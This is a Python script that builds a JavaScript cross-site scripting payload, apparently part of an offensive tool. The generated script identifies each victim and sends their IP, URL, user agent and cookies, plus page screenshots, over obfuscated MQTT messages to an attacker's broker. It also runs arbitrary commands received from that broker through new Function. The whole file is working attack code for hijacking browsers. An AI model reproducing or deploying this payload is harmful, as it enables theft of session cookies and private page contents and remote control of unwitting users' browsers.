import os
import string
import random
import requests

def getpaho():
	#get minified paho mqtt js client
	try:
		r = requests.get('https://cdnjs.cloudflare.com/ajax/libs/paho-mqtt/1.0.1/mqttws31.min.js')
		getpaho.resp = r.text
	except:
		print('Paho MQTT JS client was unavailable, unable to create JS payload')

def ws(broker, port, topic, user, passwd):
	N = 4
	res = ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))
	blemburg = (os.path.dirname(os.path.realpath(__file__))+"/js/")
	if not os.path.exists(blemburg):
		os.makedirs(blemburg)
	ws.barbosa = blemburg+topic+"-"+res+".js"
	getpaho()
	themeat = '''
	// Generate id
let vicid = (+new Date * Math.random()).toString(36).substring(0,6);
// Get IP address
'use strict';
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false );
    xmlHttp.setRequestHeader('Content-Type', 'text/plain; charset=UTF-8');
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
publicIp = httpGet("https://ifconfig.me/ip");
// Load scripts
var script = document.createElement('script');
  script.type = 'text/javascript';
  script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
  document.body.appendChild(script);

// Get screenshots
function screenshot()
{
  html2canvas(document.body).then(function(canvas) {
  var sendimage = canvas.toDataURL('image/png').split(';base64,')[1];
  message = new Paho.MQTT.Message(sendimage);
  message.destinationName = mtopic+"/ss/"+vicid;
  message.qos = 1;
  client.send(message);
})};

// Set disconnection message
bye = vicid+": Disconnected"
var blarg = bye.split('').map(e => (e.charCodeAt(0)+1).toString(16)).join('');
var rip = new Paho.MQTT.Message(blarg);rip.qos = 1;
//set variables
let baset = mtopic
let tcmd = baset+"/cmd/"+vicid;
let tout = baset+"/out/"+vicid;
let tgcmd = baset+"/rdy/"+vicid;
rip.destinationName = tout
//user name and password if required
// Create a client instance
client = new Paho.MQTT.Client(mbroker, Number(mport), "jsaw8daoasdned3-"+vicid);
let vic = "Location:"+location.href+" IP:"+publicIp+" OS:"+navigator.platform+" UA:"+navigator.userAgent;
// set callback handlers
client.onConnectionLost = onConnectionLost;
client.onMessageArrived = onMessageArrived;
// connect the client
client.connect({onSuccess:onConnect, useSSL:true, willMessage:rip, keepAliveInterval:20, userName:urrr, password:prrr});
// called when the client connects
function onConnect() {
  // Once a connection has been made, make a subscription to command topic and send vic information.
  client.subscribe(tcmd);
  var fred = vicid+": XSS fired from "+vic
  var heyo = fred.split('').map(e => (e.charCodeAt(0)+1).toString(16)).join('');
  message = new Paho.MQTT.Message(heyo);
  message.destinationName = tout;
  message.qos = 1;
  client.send(message);
  let cewk = document.cookie
  var wilma = vicid+": Cookies: "+cewk
  var cromag = wilma.split('').map(e => (e.charCodeAt(0)+1).toString(16)).join('');
  message = new Paho.MQTT.Message(cromag);
  message.destinationName = tout;
  message.qos = 1;
  client.send(message);
  screenshot();
  remy = vicid+": 1"
  var russ = remy.split('').map(e => (e.charCodeAt(0)+1).toString(16)).join('');
  message = new Paho.MQTT.Message(russ);
  message.destinationName = tgcmd;
  message.qos = 1;
  client.send(message);
};
function reConnect() {
  // Once a connection has been made, make a subscription and send a message.
  client.subscribe(tcmd);
  var barney = vicid+": Reconnected" 
  var bambim = barney.split('').map(e => (e.charCodeAt(0)+1).toString(16)).join(''); 
  message = new Paho.MQTT.Message(bambim);
  message.destinationName = tout;
  message.qos = 1;
  client.send(message);
}
function getcmd() {
  remy = vicid+": 1"
  var russ = remy.split('').map(e => (e.charCodeAt(0)+1).toString(16)).join('');
  message = new Paho.MQTT.Message(russ);
  message.destinationName = tgcmd;
  message.qos = 1;
  client.send(message);
}
// called when the client loses its connection
function onConnectionLost(responseObject) {
  if (responseObject.errorCode !== 0) {
    client.connect({onSuccess:reConnect, useSSL:true, willMessage:rip, keepAliveInterval:20, userName:urrr, password:prrr});
  }
}

// called when a message arrives
function onMessageArrived(message) {
  if (message.destinationName = tcmd) {
    //eval(message.payloadString);
    var reprs = message.payloadString.match(/.{2}/g).map(e => String.fromCharCode(parseInt(e, 16)-1)).join('');
	result = new Function(`${reprs}`)();
    var frmt = vicid+": JS response : "+result
    var werk = frmt.split('').map(e => (e.charCodeAt(0)+1).toString(16)).join('');
    message = new Paho.MQTT.Message(werk);
    message.destinationName = tout;
    message.qos = 1;
    client.send(message);
}}'''
	putstuff = open(ws.barbosa, "a+")
	putstuff.write(getpaho.resp)
	putstuff.write("\nlet mtopic = '"+topic+"'\n"+"let mport = "+str(port)+"\n"+"let mbroker = '"+broker+"'\n"+"let urrr = '"+user+"'\n"+"let prrr = '"+passwd+"'\n")
	putstuff.write(themeat)
	putstuff.close
